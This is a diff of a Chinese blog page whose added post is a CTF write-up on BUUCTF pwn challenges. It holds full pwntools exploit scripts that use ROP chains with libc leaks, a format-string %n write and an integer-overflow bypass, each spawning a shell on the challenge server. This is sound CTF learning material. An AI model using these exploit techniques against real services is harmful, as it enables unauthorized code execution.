@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">蝉3301</title>
+  <title itemprop="name">pwn-buuctf-栈溢出-格式化字符串-整形溢出 | 蝉3301</title>
   
     <link rel="shortcut icon" href="/images/GhostSoul.ico">
   
@@ -297,433 +297,324 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 0px;"></div>
-<div id="content" class="site-content">
-  
-  <div class="notice" style="margin-top:60px">
-    <i class="iconfont icon-notification">
-    </i>
-    <div class="notice-content">恶意代码分析中</div>
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png);" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      pwn-buuctf-栈溢出-格式化字符串-整形溢出</h1>
+      <p class="entry-census">
+        <span>
+          <a href="shijingtian.github.io">
+            <img src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/GhostSoul.ico">
+          </a>
+        </span>
+        <span>
+          <a href="shijingtian.github.io">蝉3301</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-9-8<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
   </div>
-  
-  <div class="top-feature-row">
-  <h1 class="fes-title" style="font-family: 'Ubuntu', sans-serif;">
-  <i class="fa fa-anchor" aria-hidden="true">
-  </i>
-  START:DASH!!</h1>
-  
-</div>
+
+<div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
-      <h1 class="main-title" style="font-family: 'Ubuntu', sans-serif;">
-      <i class="fa fa-envira" aria-hidden="true"></i>
-      Discovery</h1>
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p>重新拾起pwn的学习，这篇文章用的buuctf的题目，回顾一下栈溢出和格式化字符串</p>
+<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>要记得区分32位是直接栈上参数，64位是寄存器参数，64的有pop操作，善于利用\x00截断</p>
+<p>64位system调用记得栈对齐</p>
+<p>偏移量关于是否加4或加8，看汇编最后是否有pop <strong>ebp或者leave</strong>，<strong>没有就不用</strong></p>
+<p><strong>recv</strong><br>64位：8，32位：4</p>
+<p><strong>gdbattach</strong><br>断点要下在我们修改地址后仍能断到的地方<br>记得加pause，不然程序太快，还没来得及断就运行完了</p>
+<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>典型64位栈溢出，有一个加密函数，会对payload进行加密，但是这里他只加密了前48位对我们的payload没有影响，所以不care，然后leak出libc来，到sys取binsh就好</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
+from LibcSearcher import *
+context.log_level = &#39;debug&#39;                #开启debug方便调试
+
+choose = 1                        #选择远程或者本地
+
+if choose :
+    p = remote(&quot;node3.buuoj.cn&quot;,25266)
+    elf= ELF(&quot;./ciscn_2019_c_1&quot;)
+    #libc  = ELF(&#39;libc-2.23.so&#39;,checksec=False)
+else:
+    p = process([&#39;./ciscn_2019_c_1&#39;],env={&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;})
+    elf= ELF(&quot;./ciscn_2019_c_1&quot;)
+    #libc  = ELF(&#39;libc-2.23.so&#39;,checksec=False)
+
+puts_plt=elf.plt[&#39;puts&#39;]            #直接通过ELF寻找put的plt与got地址
+puts_got=elf.got[&#39;puts&#39;]
+start_addr=0x400790
+pop_rdi_ret=0x400c83                #通过ROPgadget --binary ./elf文件 --only &#39;pop|ret&#39;寻找
+
+payload=&quot;a&quot;*0x50+&quot;a&quot;*0x8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)        偏移量+pop地址+输出参数（这里是got地址）+对应函数+返回函数
+
+p.sendlineafter(&quot;Input your choice!\n&quot;,&quot;1&quot;)        #交互
+p.sendlineafter(&quot;Input your Plaintext to be encrypted\n&quot;,payload)
+
+
+p.recvuntil(&quot;Ciphertext\n&quot;)
+p.recvuntil(&quot;\n&quot;)
+puts_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))        #recv用ljust进行标准化，用u32进行转型
+print &quot;puts_addr is &quot;+hex(puts_addr)
+
+libc=LibcSearcher(&quot;puts&quot;,puts_addr)                #leak出对应libc版本
+
+libc_base=puts_addr-libc.dump(&quot;puts&quot;)
+system_addr=libc_base+libc.dump(&quot;system&quot;)
+str_bin_sh=libc_base+libc.dump(&quot;str_bin_sh&quot;)
+
+print &quot;libc_base is &quot;+hex(libc_base)
+print &quot;system_addr is &quot;+hex(system_addr)
+print &quot;str_bin_sh is &quot;+hex(str_bin_sh)
+
+ret_addr=0x4006b9                #这里用来对齐16字节栈，不然调用system会crack
+
+
+payload=&quot;a&quot;*0x50+&quot;a&quot;*0x8+p64(ret_addr)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)
+p.sendlineafter(&quot;Input your choice!\n&quot;,&quot;1&quot;)
+p.sendlineafter(&quot;Input your Plaintext to be encrypted\n&quot;,payload)
+
+p.interactive()
+</code></pre><h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>典型的32位栈溢出，返回函数地址payload位置与64位的位置有一定区别<br>该题有一个rand值检测，但是中间len的鉴别我们可以通过\x00截断绕过，想到了一半，这里全绕过就行了，我使用的循环爆破，第一位给他定成1然后爆破，1/16的概率命中，所以爆破起来也可以</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
+from LibcSearcher import *
+
+context.log_level=&quot;debug&quot;
+#context (arch = &quot;amd64&quot;,os = &quot;linux&quot;)
+#context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;] 
+
+choose = 0
+
+if choose :
+    p = remote(&quot;node3.buuoj.cn&quot;,28790)
+    elf= ELF(&quot;./pwn&quot;)
+    #libc  = ELF(&#39;libc-2.23.so&#39;,checksec=False)
+else:
+    p = process([&#39;./pwn&#39;],env={&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;})
+    elf= ELF(&quot;./pwn&quot;)
+    #libc  = ELF(&#39;libc-2.23.so&#39;,checksec=False)
+
+write_plt = elf.plt[&#39;write&#39;]
+write_got = elf.got[&#39;write&#39;]
+#libc_write = libc.search(&#39;write&#39;).next()            #这里search的不太准确，被坑了好久，还是leak出来dump好
+#libc_system = libc.search(&#39;system&#39;).next()
+#libc_bin_sh = libc.search(&#39;/bin/sh&#39;).next()
+fuc_addr = 0x080487D0
+
+
+def payload_create():
+    res = 0xe7*&#39;a&#39; + p32(0xdeadbeef) + p32(write_plt)  + p32(fuc_addr) + p32(1) + p32(write_got) + p32(4)             #这里的payload就与64有所不同，他要先放返回地址再去放参数，堆栈操作里，是先压得参数然后压得返回地址
+    return res
+
+def inter_speak():
+    #p.recvunril()
+    payload =  &quot;1&quot;+p32(0) 
+    payload = payload.ljust(7,&#39;1&#39;)
+    payload += p32(0xff)
+    p.sendline(payload)
+
+    try:                            #爆破通过try。。except进行，单纯if不行
+        get_str = p.recvuntil(&quot;\n&quot;)
+        if &quot;Correct&quot; in get_str:
+            return 1
+    except:
+        p.close()
+        return 0
+
+if __name__ == &quot;__main__&quot;:
+    while(1):
+        if inter_speak():
+            break
+        else:
+            p = remote(&quot;node3.buuoj.cn&quot;,29836)        失败就重新再开一个
+            #p = process(&#39;./pwn&#39;)
+    payload = payload_create()
+    p.sendline(payload)
+    #print p.recv()
+    addr = u32(p.recv(4))
+    #addr = p.recvuntil(&#39;\n&#39;).ljust(8,&#39;\x00&#39;)
+    libc = LibcSearcher(&#39;write&#39;,addr )
+    libc_base = addr - libc.dump(&#39;write&#39;)
+    sys_addr = libc_base + libc.dump(&#39;system&#39;)
+    bin_addr = libc_base + libc.dump(&#39;str_bin_sh&#39;)
+    print &quot;linc_write====&gt;&quot; + hex(libc.dump(&#39;write&#39;))
+    print &quot;libc_base====&gt;&quot; + hex(libc_base)
+    print &quot;libc_system====&gt;&quot; + hex(sys_addr)
+    print &quot;libc_bin_sh====&gt;&quot; + hex(bin_addr)
+
+    payload1 = 0xe7*&#39;a&#39; + p32(0xdeadbeef)  + p32(sys_addr) +  p32(0) +p32(bin_addr) 
+    p.sendline(payload1)
+
+    p.interactive()
+</code></pre><h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><p>%p看输入偏移<br>%n进行写，写的是输入字符串个数</p>
+<p>可以通过%offset$n确定写入位置与输入偏移位置</p>
+<p>注意有时候需要一个字节一个字节的去改，所以就会有%hhn，输入地址可用类似p32(addr+1)进行单字节传输</p>
+<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>逻辑：输入用户名密码，用户名存在格式化字符串漏洞，密码对应一个rand的bss值，通过漏洞修改bss值，在输入对应密码就ok<br>这里就用最基础的一个格式化字符串漏洞，没用之前的标准格式，多多包涵</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
+context.log_level=&quot;debug&quot;
+p = remote(&quot;node3.buuoj.cn&quot;,26879)
+bss = 0x0804C044
+payload = &quot;\x44\xc0\x04\x08&quot;+&quot;%10$n“   #这里是全局变量地址+写入操作
+p.sendlineafter(&quot;your name:&quot;,payload)
+p.sendlineafter(&quot;your passwd:&quot;,&quot;4&quot;)        #因为输入的是4个字节，所以这里修改为4
+#p.sendline(&quot;4&quot;)
+p.interactive()
+</code></pre><h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><p>注意有unsigned int 还有len的时候或者有长度小范围判断的一般都是整形溢出</p>
+<h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>自带system bin，不用leak，这种题很基础，就是判断了个字符串长度，只取0xff字节，构造0x100的flag就好。</p>
+<p><strong>ida伪代码</strong></p>
+<pre><code>char *__cdecl name_check(char *s)
+{
+  char dest; // [esp+7h] [ebp-11h]
+  unsigned __int8 v3; // [esp+Fh] [ebp-9h]
+
+  v3 = strlen(s);
+  if ( v3 &lt;= 3u || v3 &gt; 8u )
+  {
+    puts(&quot;Oops,u name is too long!&quot;);
+    exit(-1);
+  }
+  printf(&quot;Hello,My dear %s&quot;, s);
+  return strcpy(&amp;dest, s);
+}
+</code></pre><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
+from LibcSearcher import *
+
+context.log_level=&quot;debug&quot;
+#context (arch = &quot;amd64&quot;,os = &quot;linux&quot;)
+#context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;] 
+
+choose = 1
+
+if choose :
+    p = remote(&quot;node3.buuoj.cn&quot;,27514)
+    elf= ELF(&quot;./r2t3&quot;)
+    #libc  = ELF(&#39;libc-2.23.so&#39;,checksec=False)
+else:
+    p = process(&#39;./get_started_3dsctf_2016&#39;)
+    #p = process([&#39;./get_started_3dsctf_2016&#39;],env={&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;})
+    elf= ELF(&quot;./get_started_3dsctf_2016&quot;)
+    #libc  = ELF(&#39;libc-2.23.so&#39;,checksec=False)
+
+if __name__ == &quot;__main__&quot;:
+
+    flag_addr = 0x08048594
+    payload = &quot;a&quot; * 0x15  + p32(flag_addr)
+    payload = payload.ljust(0x100,&quot;a&quot;)        #这里直接填充就好，没注意好左右，卡了半天0- 0
+    payload += &quot;aaaaa&quot;            #随意填写大于3小于8的字符串就好
+    p.sendlineafter(&quot;ase input your name:&quot;,payload)
+    p.interactive()
+</code></pre><p>ps：在做这道题的时候发现用0xdeadbeef，别用0，不然经常会截断</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@master/img/custom/donate/aipay.jpg"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@master/img/custom/donate/we.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2020/09/08/cve/pwn-mprotect修改执行权限/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                pwn-mprotect修改执行权限</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/2020/06/01/virus/恶意代码分析-lab7/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                恶意代码分析-lab-7</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "vEkOEx3MM1g3rsSIlw5QanR3-gzGzoHsz",
+        appKey: "L7xfrFfDQQSv39EiUd3OFb6C",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
 
-  <div class="post-thumb">
-    <a href="/2020/03/17/ctf/逆向练习/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-3-17 14:03</div>
-      <a href="/2020/03/17/ctf/逆向练习/" class="post-title">
-        <h3>逆向练习</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/逆向/">逆向</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>逆向练习（攻防世界-first-uptime-4/7/2020 5:03:38 PM ）</p>
-        <div class="post-bottom">
-          <a href="/2020/03/17/ctf/逆向练习/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <a href="shijingtian.github.io" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/GhostSoul.ico" itemprop="image" alt="蝉3301" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="shijingtian.github.io" itemprop="url" rel="author">蝉3301</a>
+            </h3>
+          </div>
         </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/03/10/ctf/抗疫比赛/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-3-10 11:03</div>
-      <a href="/2020/03/10/ctf/抗疫比赛/" class="post-title">
-        <h3>抗疫赛ctf</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/逆向/">逆向</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>抗疫赛（含null空指针大赛）ctf(up_time:3/10/2020)</p>
-        <div class="post-bottom">
-          <a href="/2020/03/10/ctf/抗疫比赛/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/03/03/re/汇编学习-逆向/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-3-3 15:03</div>
-      <a href="/2020/03/03/re/汇编学习-逆向/" class="post-title">
-        <h3>汇编大学习</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/逆向/">逆向</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>汇编学习大杂烩</p>
-        <div class="post-bottom">
-          <a href="/2020/03/03/re/汇编学习-逆向/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/02/26/基础/Frida工具的学习/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/image-404.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-2-26 11:02</div>
-      <a href="/2020/02/26/基础/Frida工具的学习/" class="post-title">
-        <h3></h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/02/26/基础/Frida工具的学习/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/02/21/基础/linux学习/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-2-21 09:02</div>
-      <a href="/2020/02/21/基础/linux学习/" class="post-title">
-        <h3>linux学习</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/基础技术/">基础技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>linux</p>
-        <div class="post-bottom">
-          <a href="/2020/02/21/基础/linux学习/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/02/15/virus/恶意代码分析-lab3-4-5/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-2-15 11:02</div>
-      <a href="/2020/02/15/virus/恶意代码分析-lab3-4-5/" class="post-title">
-        <h3>恶意代码分析-lab-3-4-5</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/virus/">virus</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>恶意代码分析</p>
-        <div class="post-bottom">
-          <a href="/2020/02/15/virus/恶意代码分析-lab3-4-5/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/02/14/re/PE-ELF文件结构/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-2-14 11:02</div>
-      <a href="/2020/02/14/re/PE-ELF文件结构/" class="post-title">
-        <h3>PE——ELF文件格式</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/逆向/">逆向</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>逆向</p>
-        <div class="post-bottom">
-          <a href="/2020/02/14/re/PE-ELF文件结构/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/02/13/virus/恶意代码分析-lab1/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-2-13 11:02</div>
-      <a href="/2020/02/13/virus/恶意代码分析-lab1/" class="post-title">
-        <h3>恶意代码分析-lab1</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/virus/">virus</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>恶意代码分析</p>
-        <div class="post-bottom">
-          <a href="/2020/02/13/virus/恶意代码分析-lab1/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/01/29/基础/博客搭建自学注意事项/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-1-29 19:01</div>
-      <a href="/2020/01/29/基础/博客搭建自学注意事项/" class="post-title">
-        <h3>博客搭建自学注意事项</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/基础技术/">基础技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>博客搭建自学注意事项</p>
-        <div class="post-bottom">
-          <a href="/2020/01/29/基础/博客搭建自学注意事项/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="http://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2019/12/16/ctf/日常逆向ctf练习/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/shijingtian/cdn@119/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/shijingtian/cdn/img/title.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2019-12-16 09:12</div>
-      <a href="/2019/12/16/ctf/日常逆向ctf练习/" class="post-title">
-        <h3>逆向ctf练习</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/逆向/">逆向</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>逆向ctf练习</p>
-        <div class="post-bottom">
-          <a href="/2019/12/16/ctf/日常逆向ctf练习/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-
-
-    </main>
-      <!-- 首页默认取最最新文章集 -->
-    <!-- 
-      <nav class="navigator">
-        
-        <a class="extend prev" rel="prev" href="/"><i class="iconfont icon-back"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="iconfont icon-right"></i></a>
-      </nav>
-     -->
-  </div>
-  
-    <div id="pagination"><a href="/page/3/" class="">Previous</a></div>
-  
+        <hr>
+        <p><i class="iconfont icon-write"></i>一个好奇的人</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
 
     </div>    
     <div class="ins-search">
